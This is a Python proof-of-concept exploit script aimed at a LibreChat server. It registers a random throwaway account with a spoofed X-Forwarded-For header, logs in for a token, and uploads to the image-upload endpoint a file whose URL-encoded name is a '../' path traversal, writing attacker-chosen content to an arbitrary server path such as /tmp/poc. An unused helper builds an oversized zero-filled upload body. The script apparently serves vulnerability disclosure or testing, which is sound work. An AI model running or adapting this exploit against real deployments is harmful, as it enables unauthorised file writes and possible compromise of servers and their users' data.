import requests
import random
import string
import urllib.parse


server_url = "librechat"
file_path = "/tmp/poc"
file_content = "1234"

def create_multipart_content(boundary, file_size, chunk_size=409600):
    yield f'--{boundary}\r\n'.encode('utf-8')
    yield (
        f'Content-Disposition: form-data; name="input"; filename="avatar.png"\r\n'
        f'Content-Type: image/png\r\n\r\n'
    ).encode('utf-8')
    remaining = file_size
    while remaining > 0:
        current_chunk_size = min(chunk_size, remaining)
        yield b'\x00' * current_chunk_size
        remaining -= current_chunk_size
    yield b'\r\n'
    yield f'--{boundary}--\r\n'.encode('utf-8')
random_string = ''.join(random.choices(string.ascii_letters, k=8))
url1 = f'http://{server_url}:3080/api/auth/register'
url2 = f'http://{server_url}:3080/api/auth/login'
url3 = f"http://{server_url}:3080/api/files/images"
data = {
    "name": random_string,
    "username": random_string,
    "email": f"{random_string}@{random_string}.com",
    "password": random_string,
    "confirm_password": random_string
}
headers = {
    "X-Forwarded-For": random_string
}
requests.post(url1, json=data, headers=headers)
data = {"email":f"{random_string}@{random_string}.com","password":random_string}
resp = requests.post(url2, json=data, headers=headers)
token = resp.json()["token"]

headers = {
    'Authorization': f'Bearer {token}',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
}
files = {
    'file': (urllib.parse.quote('../../../../../../../../../../../../../..'+file_path, safe=''), file_content, 'image/png'),
}
response = requests.post(url3, files=files, headers=headers)